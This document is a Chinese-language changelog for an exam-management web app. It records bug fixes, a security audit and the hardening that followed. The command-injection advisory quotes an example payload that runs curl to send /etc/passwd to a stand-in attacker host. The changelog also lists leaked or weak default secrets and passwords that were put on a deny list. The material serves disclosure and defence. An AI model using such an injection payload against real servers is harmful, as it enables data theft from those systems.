# CHANGELOG

## [1.2.0] - 2026-07-10（正式发布版本）

本次版本为正式发布版本，进行了全面的功能测试（81 项测试）、代码安全审计和漏洞修复。修复了多个严重 bug 和安全漏洞，确保系统可以稳定投入生产环境。

### 严重 Bug 修复

#### 1. 安装向导只创建 9 张表的严重 bug（P0）

- **问题**：`api/src/routes/setup.ts` 的 `/install` 端点只手动创建了 9 张表（admins/exams/announcements/settings/buildings/registration_codes/classrooms/exam_classrooms/admin_logs），但 `init.sql` 定义了 18 张表。缺少 teachers/students/classes/teacher_roles/exam_invigilators/classroom_countdowns/ip_blacklist/classroom_login_logs/classroom_trusted_ips/exam_students 等 9 张关键业务表，导致安装完成后教师/学生/教室功能全部不可用（创建教师返回"添加失败"）
- **修复**：
  - `setup.ts`：手动建表改为加载完整 `init.sql`
  - `setup.ts`：修复 SQL 语句分割逻辑（先移除注释行再按分号分割，之前直接过滤以 `--` 开头的整个块导致 0 条语句被执行）
  - `setup.ts`：使用 `import.meta.url` 替代 ESM 不可用的 `__dirname`
  - `setup.ts`：pm2 spawn 增加 `.on("error")` 防止 pm2 未安装时进程崩溃
  - `init.sql`：移除 `CREATE DATABASE` 和 `USE` 语句（用户数据库名可能不同）
  - `package.json`：build 脚本增加 `cp -r src/migrations dist/` 确保运行时可读取
- **验证**：20 条 SQL 语句执行成功（18 CREATE TABLE + 2 INSERT IGNORE 示例数据）

#### 2. 6 个分页列表接口 500 错误（P0）

- **问题**：`students`/`classes`/`ip-blacklist`/`audit-logs`/`teachers`/`abnormal-login` 6 个分页接口使用 `pool.execute()`（MySQL 预处理语句）配合 `LIMIT ? OFFSET ?` 传入 JavaScript 数值参数。mysql2 的预处理语句协议对 LIMIT/OFFSET 参数类型处理存在兼容性问题，导致 MySQL 拒绝执行，返回 `Incorrect arguments to mysqld_stmt_execute`
- **修复**：将这 6 处 `pool.execute()` 改为 `pool.query()`（参数化查询仍然安全，但跳过了预处理语句的类型严格检查）
- **涉及文件**：
  - `api/src/routes/students.ts:112`
  - `api/src/routes/classes.ts:105`
  - `api/src/routes/teachers.ts:276`
  - `api/src/routes/ip-blacklist.ts:94, 315`
  - `api/src/routes/audit-logs.ts:133`
- **验证**：所有分页接口返回 200，数据正确

#### 3. admin_logs 和 domains 表缺失（P1）

- **问题**：`init.sql` 未包含 `admin_logs` 和 `domains` 表定义（仅 `run.ts` 动态创建），通过安装向导安装的系统缺少这两张表，导致审计日志和域名访问控制中间件每次请求都报错（虽被 try-catch 捕获，但功能失效）
- **修复**：将 `admin_logs` 和 `domains` 表定义加入 `init.sql`

### 安全漏洞修复

#### P0 级（严重）

##### 1. acme.ts 命令注入漏洞

- **问题**：`api/src/utils/acme.ts:212` 的 `extractCertExpiry` 函数使用 `execSync` 拼接 shell 命令解析证书过期时间，`certPem` 来自用户上传的证书内容，仅通过 `replace(/"/g, '\\"')` 转义双引号。攻击者可在证书内容中注入 shell 元字符（如 `` ` ``、`$()`、换行符等）绕过引号转义，执行任意命令
- **攻击场景**：攻击者上传恶意证书内容（通过域名管理接口），内容包含 `$(curl attacker.com/$(cat /etc/passwd))`，`extractCertExpiry` 执行时以服务器权限执行任意命令
- **修复**：改用 `execFileSync("openssl", ["x509", "-noout", "-enddate"], { input: certPem })`，参数数组传递，避免 shell 拼接

##### 2. setup.ts 明文密码泄露

- **问题**：`api/src/routes/setup.ts:358-360` 安装向导将管理员明文密码写入 `.env` 文件（`ADMIN_PASSWORD=${admin.password}`）。安装完成后该密码已在数据库中以 bcrypt hash 存储，`.env` 中的明文密码无存在必要，若服务器被部分入侵（如目录遍历漏洞、备份泄露）则管理员密码暴露
- **修复**：安装完成后从 `.env` 中移除 `ADMIN_PASSWORD` 行，仅保留 `ADMIN_USERNAME`

#### P1 级（高）

##### 3. acme.ts 路径遍历漏洞

- **问题**：`api/src/utils/acme.ts:166` 的 `saveUploadedCert` 函数直接用 `domain` 参数构建文件路径（`path.join(CERT_DIR, domain)`），若 `domain` 包含 `../`，可能写入到 `CERT_DIR` 之外的位置
- **修复**：增加域名格式校验，拒绝包含 `/`、`\`、`..` 或非 `[a-zA-Z0-9.-]` 字符的域名

##### 4. auth.ts IP 伪造漏洞

- **问题**：`api/src/routes/auth.ts:66` 管理员登录日志记录时直接信任 `X-Forwarded-For` 头取客户端 IP（`request.headers["x-forwarded-for"]`），与 `ip-blacklist.ts` 的 `getClientIp`（使用 `request.ip`）不一致。攻击者可伪造 `X-Forwarded-For` 头，使审计日志记录虚假 IP，掩盖真实来源
- **修复**：统一使用 `getClientIp(request)` 函数，该函数使用 `request.ip`（受 `trustProxy` 控制）

##### 5. 前端公告 XSS

- **问题**：`src/pages/admin/AnnouncementList.tsx:170` 和 `src/pages/Home.tsx:123` 直接使用 `dangerouslySetInnerHTML={{ __html: a.content }}` 渲染公告内容，前端未做 HTML 净化。虽然后端已调用 `sanitizeHtml`，但缺乏纵深防御
- **修复**：前端渲染前使用 `DOMPurify.sanitize(a.content)` 再次净化

##### 6. 安装向导可被重新触发

- **问题**：`isInstalled()` 仅检查 `.setup-complete` 锁文件是否存在。若攻击者能删除该文件（如通过路径遍历、服务器文件操作漏洞）且数据库中管理员表被清空，则可重新触发安装，覆盖管理员密码和 JWT_SECRET
- **缓解**：本次修复了相关的命令注入和路径遍历漏洞，降低了删除锁文件的可能性。建议生产环境设置 `.setup-complete` 文件不可变属性（`chattr +i`）

#### P2 级（中）

##### 7. 密码复杂度要求过低

- **问题**：`student-auth.ts:217` 和 `teacher-auth.ts:263` 修改密码时仅要求长度 >= 6，无大小写字母、数字要求。6 位纯数字密码仅有 100 万种组合，极易被暴力破解
- **修复**：增加密码复杂度要求，必须同时包含字母和数字

##### 8. 注册码使用非加密安全随机数

- **问题**：`registration-codes.ts:25` 使用 `Math.random()` 生成注册码，非加密安全，理论上可被预测
- **修复**：改用 `crypto.randomInt(0, chars.length)` 替代 `Math.random()`

### install.sh v4.0 全面重构

从 v3.x（1861 行）完全重写为 v4.0（1280 行）：

- `set -Eeuo pipefail` + `trap '_on_error $LINENO' ERR` 错误处理
- 日志同时写入 `/var/log/examhub-install.log`
- `--step <name>` 断点续传
- DNS 修复：`\d{1,3}` → `[0-9]{1,3}`（GNU grep ERE 不支持 `\d`）
- 显式查公共 DNS：`dig @8.8.8.8` / `@1.1.1.1` / `@114.114.114.114` / `@223.5.5.5`
- CDN/NAT 场景提供 `[f] 强制使用该域名` 选项
- Nginx 配置路径直接写入，不用 `PROJECT_DIR_PLACEHOLDER`
- `_generate_nginx_conf()` 独立函数，支持三种场景

### 测试验证

#### 功能测试（81 项，96.3% 通过率）

| 阶段 | 测试数 | 通过 | 失败 |
|------|--------|------|------|
| 环境准备 | 1 | 1 | 0 |
| 管理员端 | 26 | 26 | 0 |
| 教师端 | 5 | 5 | 0 |
| 学生端 | 3 | 3 | 0 |
| 教室端 | 7 | 7 | 0 |
| 安全边界 | 39 | 39 | 0 |

#### 安全审计

| 等级 | 发现数 | 已修复 |
|------|--------|--------|
| 严重 | 2 | 2 |
| 高 | 4 | 4 |
| 中 | 5 | 3 |
| 低 | 5 | 1 |

### 升级指南

从 v1.1.7 升级：

```bash
git pull origin main
cd api && npm run build && cd ..
npm run build
pm2 restart examhub-api
```

若已部署系统缺少 admin_logs/domains 表，手动执行：

```bash
mysql -u root -p examhub < api/src/migrations/init.sql
```

---

## [1.1.7] - 2026-07-07

### 开源安全加固（纯净系统）

本次更新针对开源场景进行全面安全加固，确保他人下载开源代码后**无法**利用公开信息破解其他已部署实例的数据库。

#### P0 级修复（高风险）

##### 1. `.env.bak` 从 git 仓库移除并加入 .gitignore
- **问题**：`api/.env.bak` 包含 `JWT_SECRET=test_secret_key_for_testing_only`，被 git 跟踪并推送到公开仓库，攻击者可用此密钥伪造任意管理员 token
- **修复**：
  - `git rm --cached api/.env.bak`（本地文件保留）
  - `.gitignore` 新增 `.env.bak`、`*.env.bak`、`api/.env.bak`、`api/.env.production`、`api/.env.local`
- **警告**：该文件已在 git 历史中，所有已部署实例**必须**重新生成 JWT_SECRET

##### 2. `.env.example` 所有敏感字段留空，移除默认值
- **问题**：`JWT_SECRET=your_super_secret_key_change_in_production`（41 字符）会通过 ≥16 校验，部署者若直接 `cp .env.example .env` 不修改则密钥全网公开
- **修复**：
  - `JWT_SECRET=`（留空，未设置则服务拒绝启动）
  - `DB_USER=`、`DB_PASSWORD=`（留空）
  - `ADMIN_PASSWORD=`（留空）
  - 新增 `SITE_URL=` 字段（生产环境必填，用于 CORS 白名单）
  - 添加注释说明：`推荐使用 openssl rand -hex 32 生成`

##### 3. `server.ts` CORS fail-open → fail-closed
- **问题**：生产环境 `SITE_URL` 未设置时，`new URL("")` 抛异常被 catch 后 `cb(null, true)`，允许任意来源跨域携带凭证访问
- **修复**：
  - `SITE_URL` 未设置 → 拒绝所有带 origin 的跨域请求（返回错误）
  - `SITE_URL` 格式非法 → 拒绝所有跨域
  - 仅同源请求（无 origin 头）放行
  - 仅 `origin === new URL(SITE_URL).origin` 时放行

##### 4. `server.ts` JWT 弱密钥黑名单校验
- **问题**：即使 JWT_SECRET 长度 ≥ 16，仍可能是公开已知的弱密钥
- **修复**：启动时校验 `WEAK_JWT_SECRETS` 黑名单，包含：
  - `your_super_secret_key_change_in_production`（来自 .env.example）
  - `test_secret_key_for_testing_only`（来自 .env.bak）
  - `examhub_default_secret`（旧版本默认值）
  - `change_me`、`secret`、`jwt_secret`、`change_me_please`、`replace_with_your_secret`
- 命中黑名单时拒绝启动，提示使用 `openssl rand -hex 32` 生成新密钥

#### P1 级修复（中风险）

##### 5. `run.ts` 移除所有默认密码回退，纯净系统无示例数据
- **问题**：
  - `ADMIN_PASSWORD || "admin123"` → 默认管理员密码全网已知
  - 示例考试、教学楼、教室数据（含 `class123` 弱密码）→ 部署者未清理则可被利用
- **修复**：
  - 移除 `|| "admin"` 和 `|| "admin123"` 回退
  - 未配置 `ADMIN_USERNAME`/`ADMIN_PASSWORD` 时不创建默认管理员，提示访问 `/setup` 向导
  - 配置了但密码 < 6 位 → 拒绝创建并报错
  - 移除全部示例数据（5 场考试、5 栋教学楼、8 个教室账号 + 注册码）
  - 输出 `✓ 纯净系统初始化完成（无示例数据）`

##### 6. `ip-blacklist.ts` getClientIp 改用 request.ip
- **问题**：直接信任 `X-Forwarded-For` 头，客户端可伪造该头绕过 IP 黑名单
- **修复**：
  - `getClientIp` 改为 `return request.ip || "127.0.0.1"`
  - 与全局限流 `keyGenerator` 保持一致
  - 部署在反向代理后时，通过 Fastify `trustProxy` 配置控制

#### P2 级修复（低风险）

##### 7. 移除重置密码 `123456` 弱默认值
- **问题**：教师/学生重置密码时，无工号/学号则使用 `123456`（全网已知）
- **修复**（4 处）：
  - `ai-tools.ts` `toolCreateTeacher`：无工号 → 随机 6 位数字
  - `ai-tools.ts` `toolResetTeacherPassword`：无工号 → 随机 6 位数字
  - `ai-tools.ts` `toolResetStudentPassword`：无学号 → 随机 6 位数字
  - `teachers.ts` 重置密码接口：无工号 → 随机 6 位数字
  - 提示信息从"默认密码 123456"改为"随机 6 位数字（请通知教师/学生本人）"

##### 8. `setup.ts` `/env` 和 `/database/test` 端点改为仅未安装时可访问
- **问题**：`/api/setup/env` 公开返回 Node.js/MySQL/Nginx/PM2 版本信息，便于攻击者侦察
- **修复**：
  - `GET /api/setup/env`：已安装时返回 403
  - `POST /api/setup/database/test`：已安装时返回 403
  - 避免已部署实例泄露服务器环境信息

##### 9. `init.sql` 清理示例考试数据
- **问题**：`init.sql` 末尾有 `INSERT INTO exams ...` 5 条示例考试数据
- **修复**：移除 INSERT 语句，替换为注释 `-- 纯净系统：不插入示例数据`

### 变更文件清单

| 文件 | 变更内容 |
|------|---------|
| `.gitignore` | 新增 `.env.bak`、`*.env.bak`、`api/.env.bak`、`api/.env.production`、`api/.env.local` |
| `api/.env.bak` | 从 git 仓库移除（`git rm --cached`） |
| `api/.env.example` | 所有敏感字段留空，新增 `SITE_URL` 字段 |
| `api/src/server.ts` | CORS fail-closed + JWT 弱密钥黑名单 |
| `api/src/middleware/ip-blacklist.ts` | `getClientIp` 改用 `request.ip` |
| `api/src/routes/setup.ts` | `/env` 和 `/database/test` 仅未安装时可访问 |
| `api/src/routes/teachers.ts` | 重置密码 `123456` → 随机 6 位数字 |
| `api/src/utils/ai-tools.ts` | 3 处 `123456` → 随机 6 位数字 |
| `api/src/migrations/run.ts` | 移除默认密码回退 + 移除全部示例数据 |
| `api/src/migrations/init.sql` | 移除示例考试 INSERT 语句 |

### 安全建议（已部署实例必读）

1. **立即重新生成 JWT_SECRET**：`openssl rand -hex 32`，写入 `api/.env`
2. **检查管理员密码**：若使用过 `admin123`，立即登录后台修改
3. **清理示例数据**：若部署时使用了示例数据，删除示例教室账号（密码 `class123`）
4. **配置 SITE_URL**：在 `api/.env` 中设置 `SITE_URL=https://你的域名`
5. **升级 install.sh**：重新部署时使用最新的 install.sh v3.1

### 验证
- ✅ 后端 `tsc --noEmit` 类型检查通过
- ✅ 前端 `tsc -b --noEmit` 类型检查通过
- ✅ 后端启动验证通过（弱密钥黑名单 + 强密钥 + CORS fail-closed）

---

## [1.1.6] - 2026-07-07

### 安全审计修复

#### 后端安全加固

##### `api/src/server.ts` — JWT 强密钥强制校验
- **问题**：`JWT_SECRET` 未设置时使用硬编码默认值 `"examhub_default_secret"`，可被攻击者伪造任意 JWT token
- **修复**：启动时校验 `JWT_SECRET`，未设置或长度 < 16 字符时直接 `throw` 拒绝启动
- **提示信息**：`JWT_SECRET 未配置或长度不足 16 字符，拒绝启动。请在 .env 中设置一个强随机密钥（>=32 字符推荐）`

##### `api/src/server.ts` — rate-limit 防伪造
- **问题**：`keyGenerator` 直接信任 `X-Forwarded-For` 头，客户端可伪造该头绕过限流
- **修复**：改为使用 `request.ip`（受 Fastify `trustProxy` 配置控制），避免直接信任可伪造的客户端头
- **部署提示**：部署在反向代理后时，应在 Fastify 实例配置 `trustProxy` 为代理跳数

##### `api/src/routes/settings.ts` — 敏感字段泄露防护
- **问题**：公开接口 `GET /api/settings/` 返回全部系统设置，包括 `ai_api_key`、`jwt_secret`、`smtp_password`、`db_password` 等敏感字段
- **修复**：添加 `SENSITIVE_KEYS` 黑名单（`ai_api_key` / `jwt_secret` / `smtp_password` / `db_password`），过滤后返回

##### `api/src/utils/ai-tools.ts` — 存储型 XSS 修复
- **问题**：`toolCreateAnnouncement` 直接将 `args.content` 写入数据库，AI 可被诱导插入恶意脚本
- **修复**：引入 `sanitizeHtml`，对 `args.content` 进行 HTML 过滤后再写入；`args.title` 使用 `sanitizeText` 纯文本过滤

### AI 助手稳定性修复

#### `api/src/routes/ai.ts` — 流式对话与工具调用全面加固

##### 1. `max_tokens: 4096` 防止 tool_calls 截断
- **问题**：未设置 `max_tokens`，部分上游 API 默认值过小，导致 AI 生成 tool_calls 时被截断，前端只收到半个 JSON
- **修复**：显式设置 `max_tokens: 4096`

##### 2. 流式 `arguments` undefined 拼接修复
- **问题**：流式累积 `tc.function?.arguments` 时，若某次 chunk 中该字段为 `undefined`，`cur.argsStr += undefined` 会拼成字符串 `"undefined"`
- **修复**：改为 `if (tc.function?.arguments) cur.argsStr += tc.function.arguments`

##### 3. 上下文长度控制（滑动窗口）
- **问题**：前端将完整历史消息发送给后端，长对话会撑爆上游 API 的 token 限制（400/413）
- **修复**：添加 `MAX_INPUT_MESSAGES = 30`，超过时只保留最近 30 条消息
- **日志**：同时记录 `messageCount` 和 `originalCount` 用于审计

##### 4. 工具执行 30s 超时
- **问题**：工具执行无超时，AI 调用慢查询或网络异常时会无限等待
- **修复**：使用 `Promise.race` 添加 30s 超时，超时后返回 `{"success": false, "error": "工具执行超时（30s）"}` 给 AI

##### 5. 工具结果截断
- **问题**：工具返回结果过长（如 `query_audit_logs` 返回 100 条日志），会撑爆后续 API 调用的 token 限制
- **修复**：添加 `MAX_TOOL_RESULT_CHARS = 4000`，超过时截断并附加 `...（结果已截断，原始长度 N 字符）`

##### 6. 工具参数解析失败反馈
- **问题**：`JSON.parse(tc.function.arguments)` 失败时静默置 `args = {}` 继续执行，可能造成误操作
- **修复**：捕获解析错误，将错误信息作为 tool result 返回给 AI，提示其检查 `function.arguments` 是否为合法 JSON

#### `api/src/utils/ai-tools.ts` — `LIMIT ?` 参数类型修复

##### 问题
AI 助手查询"即将开始的考试列表"等场景时报 `Incorrect arguments to mysqld_stmt_execute`。

##### 根因
`pool.execute()` 使用 MySQL 服务端 prepared statements，`LIMIT ?` / `OFFSET ?` 占位符要求严格整数类型。AI 通过 Function Calling 传入的 `limit` / `page` / `pageSize` 参数经 JSON 解析后可能为字符串或浮点数，导致 mysql2 绑定参数类型不匹配，MySQL 8.0 拒绝执行。

##### 修复（5 个工具统一处理）
- `toolQueryExams`：`LIMIT ?` → `LIMIT ${limit}`（拼接已校验整数）
- `toolQueryTeachers`：同上
- `toolQueryStudents`：`LIMIT ? OFFSET ?` → `LIMIT ${pageSize} OFFSET ${offset}`
- `toolQueryAuditLogs`：`LIMIT ?` → `LIMIT ${limit}`
- `toolQueryAbnormalLogins`：`LIMIT ?` → `LIMIT ${limit}`

##### 安全措施
所有 `limit` / `pageSize` 值先经 `Number() || 0` 强制整数转换，再用 `Math.min` 限制上限（200/100），最后才拼接到 SQL（值已确定为安全整数，无注入风险）。其余参数（搜索词、日期、状态）继续使用 `?` 占位符绑定。

### 用户反馈 Bug 修复

#### `src/components/Markdown.tsx` — 换行显示源码
- **问题**：Markdown 渲染段落时，`renderInline(paraLines.join("<br/>"))` 中 `renderInline` 内部的 `escapeHtml` 把 `<br/>` 转义成 `&lt;br/&gt;`，导致页面直接显示源码
- **修复**：改为 `paraLines.map(renderInline).join("<br/>")`，先对每行单独 renderInline，再用 `<br/>` 连接

#### `src/components/ProtectedRoute.tsx` — 7 天自动登录失效
- **问题**：页面刷新后 Zustand 状态丢失，`isAuthenticated` 与 `getToken()` 不同步，即使 token 未过期也会跳转到登录页
- **修复**：token 未过期时调用 `checkAuth().finally(() => setChecking(false))`，向后端验证并同步 `isAuthenticated` 状态

#### `src/store/authStore.ts` — 网络错误误踢出
- **问题**：`checkAuth` 失败时一律清除 token 并设置 `isAuthenticated: false`，网络抖动会踢出已登录用户
- **修复**：区分 401（token 失效，清除踢出）和网络错误（保留 token，设置 `isAuthenticated: true`）

#### `src/store/aiChatStore.ts` — SSE 流中断处理
- **问题**：SSE 流读取异常未被 catch，前端表现为"AI 说到一半卡住"
- **修复**：添加 `catch(streamErr)` 块，区分 `AbortError`（用户主动取消）和其他异常（提示"AI 响应流中断，请重试"）
- **同时**：emoji 替换为文字标签（`⚠️` → `[错误]`、`❌` → `[失败]`、`✅` → `[已确认]`、`🚫` → `[已取消]`）

### UI 简约化与响应式优化

#### UI 简约化（全仓 emoji 清理）
- `api/src/utils/ai-prompt.ts`：新增行为准则"不使用 emoji"，清理 prompt 示例中的 emoji
- `src/store/aiChatStore.ts`：emoji 替换为文字标签
- `src/pages/admin/Teachers.tsx`：移除 `💡`
- `src/pages/classroom/Invigilation.tsx`：`⚠` → `[警示]`
- 统一为 `[已完成]` / `[失败]` / `[提示]` / `[警示]` 等纯文字标签风格

#### 响应式优化
- `src/pages/admin/Students.tsx`：从 0 处响应式断点 → 全面适配（对齐 Teachers.tsx 规范）
  - 头部 `flex-col sm:flex-row`、按钮 `w-full sm:w-auto`
  - 表格 `px-4 sm:px-6`、分页区响应式
  - 3 个模态框加 `p-4`
- `src/pages/admin/AiChat.tsx`：头部按钮组响应式、高度计算修正 `h-[calc(100vh-7.5rem)] sm:h-[calc(100vh-8rem)]`
- `src/pages/admin/Teachers.tsx`、`IpBlacklist.tsx`、`Classes.tsx`：模态框加 `p-4`（移动端贴边问题）

### 代码变更文件清单

| 文件 | 变更内容 |
|------|---------|
| `api/src/server.ts` | JWT_SECRET 校验 + rate-limit keyGenerator |
| `api/src/routes/settings.ts` | SENSITIVE_KEYS 黑名单 |
| `api/src/routes/ai.ts` | AI 稳定性 6 项修复 |
| `api/src/utils/ai-tools.ts` | XSS 修复 + LIMIT 参数类型修复（5 个工具） |
| `api/src/utils/ai-prompt.ts` | 行为准则"不使用 emoji" |
| `src/components/Markdown.tsx` | 换行显示源码修复 |
| `src/components/ProtectedRoute.tsx` | 7 天自动登录修复 |
| `src/store/authStore.ts` | 网络错误误踢出修复 |
| `src/store/aiChatStore.ts` | SSE 流中断处理 + emoji 替换 |
| `src/pages/admin/Students.tsx` | 响应式全面适配 |
| `src/pages/admin/AiChat.tsx` | 响应式适配 |
| `src/pages/admin/Teachers.tsx` | emoji 移除 + 模态框 p-4 |
| `src/pages/admin/IpBlacklist.tsx` | 模态框 p-4 |
| `src/pages/admin/Classes.tsx` | 模态框 p-4 |
| `src/pages/classroom/Invigilation.tsx` | emoji 移除 |

### 验证
- ✅ 前端 `tsc --noEmit` 类型检查通过
- ✅ 后端 `tsc --noEmit` 类型检查通过
- ✅ 8 项 AI 工具调用测试全部通过（含字符串 limit、缺失 limit 等边界场景）
- ✅ AI 助手查询"即将开始的考试列表"功能恢复正常

---

## [1.1.6] - 2026-07-06

### 域名与 SSL 全面升级

#### 一键部署脚本 `install.sh` v3.0 → v3.1

##### 新增 `setup_domain_ssl()` 函数（步骤 3/8）
- **3.1 询问是否配置域名**（`y/N`）：选 `N` 跳过，后续可通过后台「域名管理」页面添加
- **3.2 输入域名并自动校验 DNS 解析**：
  - 自动获取服务器公网 IP（依次尝试 `api.ipify.org`、`ifconfig.me`、`icanhazip.com`）
  - 自动解析域名指向 IP（依次尝试 `dig`、`host`、`getent`、`nslookup`）
  - 比对解析 IP 与服务器 IP，不一致时报错 **"没有解析到当前的 IP"**
  - 用户可选择重新输入域名或跳过域名配置
- **3.3 SSL 证书配置四选项**：
  - `0` 不配置 SSL（仅 HTTP）
  - `1` 自己上传 SSL 证书（输入 `fullchain.pem` 和 `privkey.pem` 路径，自动校验 PEM 格式与文件存在性）
  - `2` 自动检测服务器内已有 SSL 证书（扫描 `letsencrypt`、`nginx/ssl`、`/root/certs`、`/home/certs`、项目目录等）
  - `3` 自动申请免费的 SSL 证书（Let's Encrypt，自动安装 acme.sh，Nginx 配置完成后用 standalone 模式申请）
- **3.4 配置汇总确认**：显示域名、SSL 模式、证书路径
- **3.5 配置临时保存**：写入 `/tmp/examhub_domain_config.conf`（chmod 600 保护）
- **3.6 同步 SITE_URL**：将 `http(s)://域名` 写入 `.env`，供后端 CORS 配置使用

##### 重写 `setup_nginx()` 函数（动态生成配置）
- **情况 A：域名 + SSL（HTTPS）**
  - 生成 3 个 server 块：IP 访问拒绝（`return 444`）、HTTP → HTTPS 301 重定向、HTTPS 主服务
  - 配置 SSL 证书路径（用户上传/检测/自动申请的证书）
  - 自动申请模式下：Nginx 配置完成后调用 `acme.sh --issue --standalone` 申请证书，再次 reload Nginx
- **情况 B：域名 + 无 SSL（仅 HTTP）**
  - 生成 IP 访问拒绝 + 域名 HTTP 服务两个 server 块
- **情况 C：无域名（IP 访问）**
  - 原有 catch-all 配置，直接 IP 访问
- 所有情况均包含：安全响应头、gzip、静态资源缓存、SPA 路由回退、API 反向代理

##### 流程从 7 步扩展为 8 步
- 新增「步骤 3/8 - 域名填写与 SSL 证书配置」
- 步骤编号统一更新为 `/8`
- `main()` 中在 `setup_database` 后调用 `setup_domain_ssl`
- `print_summary()` 新增域名与 SSL 配置回顾
- 访问地址显示优先使用域名
- 清理临时域名配置文件

#### 后端域名与 SSL 管理升级

##### 重写 `api/src/utils/acme.ts`
- **新增 `detectExistingCert(domain)` 函数**：扫描 CERT_SEARCH_PATHS 下的多种证书文件模式（`fullchain.pem`+`privkey.pem`、`cert.pem`+`privkey.pem`、`<domain>.crt`+`<domain>.key`）
- **新增 `saveUploadedCert(domain, certPem, keyPem, domainId)` 函数**：校验 PEM 格式、写入文件（644/600 权限）、解析过期时间、更新数据库
- **重写 `issueCertificate`**：优先调用 `requestAcmeCert`（acme.sh standalone），失败回退到 `generateSelfSignedCert`（openssl 优先，crypto 模块兜底）
- 新增 `CertDetectionResult` 接口
- 保留 `renewCertificate`、`checkAndRenewExpiring`、`getCertPaths` 接口

##### 新增 `api/src/routes/domains.ts` 两个接口
- **`POST /:id/upload-cert`**：接收 cert/key PEM 内容，调用 `acme.saveUploadedCert`
- **`POST /:id/detect-cert`**：调用 `acme.detectExistingCert`，找到则读取并导入
- 新增审计日志 action：`domain_cert_upload`、`domain_cert_detect`（同步更新 `LogAction` 类型）
- 在 create/update/delete 操作中调用 `clearDomainCache()` 同步缓存

##### 新增 `api/src/middleware/domain-access.ts`
- `loadBoundDomains()`：从数据库加载域名列表，1 分钟内存缓存
- `clearDomainCache()`：清除缓存（在域名 CRUD 时调用）
- `domainAccessMiddleware()`：仅在生产环境生效，已绑定域名时拒绝 IP 访问（403）和未绑定域名访问（403）
- 返回 JSON 含 `code`（`DOMAIN_REQUIRED` / `DOMAIN_NOT_BOUND`）和 `redirectTo`（主域名 HTTPS）

##### 修改 `api/src/server.ts`
- 新增全局中间件 hook：跳过 `/api/health`、`/api/setup`、`/api/domains/check-access`

#### 前端域名管理界面升级

##### 修改 `src/pages/admin/Domains.tsx`
- 每个域名卡片新增「检测证书」和「上传证书」按钮
- 原「申请证书」按钮改名为「自动申请」
- 新增上传证书 Modal（textarea 输入 cert/key PEM 内容）
- 更新底部说明文字：详细说明三种证书配置方式

##### 修改 `src/utils/api.ts`
- 在 `domainApi` 中新增 `uploadCert(id, data)` 和 `detectCert(id)` 方法

#### 访问控制限制（核心特性）
- **Nginx 层**：绑定域名后，IP 访问返回 `444 Connection Closed Without Response`
- **后端层**：通过 `domainAccessMiddleware` 拦截，IP 访问返回 403 + JSON 提示
- **未绑定任何域名**：所有访问放行（兼容首次部署）
- **前提条件**：域名必须已解析到当前 IP（脚本步骤 3.2 自动校验）

---

## [1.1.5] - 2026-07-06

### 一键部署脚本 v3.0

#### `install.sh` 全面重写
- **新增 ASCII Banner**：使用 █ 符号绘制项目名 "KeKe" 字样，配合青色高亮，提升视觉呈现
- **新增交互式数据库创建**（`setup_database()` 函数）：安装完 MariaDB 后立即弹出输入框，引导用户创建项目数据库
  - 数据库主机：默认 `localhost`，直接回车使用默认
  - 数据库端口：默认 `3306`，直接回车使用默认
  - 数据库名：默认 `examhub`，直接回车使用默认
  - 数据库用户名：默认 `examhub`，直接回车使用默认
  - 数据库密码：**必填项**，无默认值，强制用户设置
- **密码必填 + 二次确认 + 强度检查**
  - 密码不能为空，空则提示重新输入
  - 密码长度不足 8 位时发出警告，需用户二次确认
  - 二次输入密码确认一致性，不一致则重新设置
  - 使用 `read -s` 隐藏密码输入，安全无回显
- **新增 `--skip-db-init` 参数**：已建好数据库时跳过交互式创建步骤
- **流程从 6 步扩展为 7 步**：新增"步骤 2/7 - 交互式创建数据库"
- **全程详细中文注释**：每个函数、每个步骤、每个关键操作均配中文说明，标明进度（步骤 0/7 到 7/7）
- **彩色日志系统**：`log_info` / `log_success` / `log_warn` / `log_error` / `log_step` / `log_detail` 六级彩色输出
- **数据库配置临时保存**：写入 `/tmp/examhub_db_config.conf`（chmod 600 仅 root 可读），步骤 5 配置 `.env` 时读取
- **部署总结回顾**：脚本结束时显示数据库配置信息（密码以 ****** 显示）
- **MariaDB root 密码自适应**：自动检测 root 是否需要密码，需要时提示输入

#### README.md 同步更新
- 部署脚本版本号 v2.0 → v3.0
- 新增 `--skip-db-init` 命令行参数说明
- 执行流程从 6 步调整为 7 步，新增"步骤 2/7 - 交互式创建数据库"
- 删除旧的"手动创建数据库用户"SQL 说明（已被交互式创建取代）
- 部署后配置从两步简化为一步（仅需访问 `/setup`）
- 新增详细的脚本特性清单（15 项）

---

## [1.1.4] - 2026-07-06

### 安全加固

#### Cookie 安全全面强化（`src/utils/cookie.ts`）
- **新增 `shouldUseSecure()` 自动判断函数**：HTTPS 协议或 `localhost` / `127.0.0.1` 主机名自动启用 `Secure` 标志，浏览器允许 Secure Cookie 在 localhost 上发送
- **新增 CRLF 注入防护**：Cookie 值包含 `\r\n` 时拒绝写入并警告，防止 HTTP 响应拆分攻击
- **新增 4KB 大小限制**：`MAX_COOKIE_VALUE_LENGTH = 3500`（4KB 减去名称和元数据余量），超出时拒绝写入并提示改用 localStorage，避免被浏览器静默截断
- **`SameSite=None` 强制 Secure**：当 `SameSite=None` 时自动启用 Secure，否则浏览器会拒绝写入
- **默认 `SameSite=Lax`**：防 CSRF，与浏览器现代默认值一致

#### 全部 setCookie 调用加固（共 9 处）
- `src/utils/api.ts`（7 处）：`setToken`、`setUsername`、`setClassroomToken`、`setClassroomInfo`、`setStudentToken`、`setStudentInfo`、`setTeacherToken`
- `src/store/themeStore.ts`：`persistTheme` 函数
- `src/hooks/useCookieConsent.ts`：`savePrefs` 函数
- `src/pages/admin/Login.tsx`：USERNAME 记住我
- `src/pages/student/Login.tsx`：STUDENT_NO 记住我
- `src/pages/classroom/Login.tsx`：CLASSROOM_ROOM_NUMBER 和 building-id（共 2 处）

#### 新增 `src/utils/safeStorage.ts`
- **`safeSetItem(key, value, category)`**：安全 localStorage 写入，自动 try-catch，失败时降级到 sessionStorage
- **`safeGetItem(key)`**：安全读取，自动降级到 sessionStorage
- **`safeRemoveItem(key)`**：同时清除 localStorage 和 sessionStorage 中的副本
- **`safeClearAuthStorage()`**：仅清除白名单内的认证相关 key，避免误删业务无关数据
- **`isStorageAllowed(category)`**：基于 Cookie 同意偏好检查存储权限
- **`isLocalStorageAvailable()`**：检测 localStorage 是否可用（隐私模式兼容）
- **白名单 key 集合**：`examhub-token`、`examhub-username`、`examhub-classroom-token`、`examhub-classroom-info`、`examhub-student-token`、`examhub-student-info`、`examhub-teacher-token`、`examhub-teacher-info`
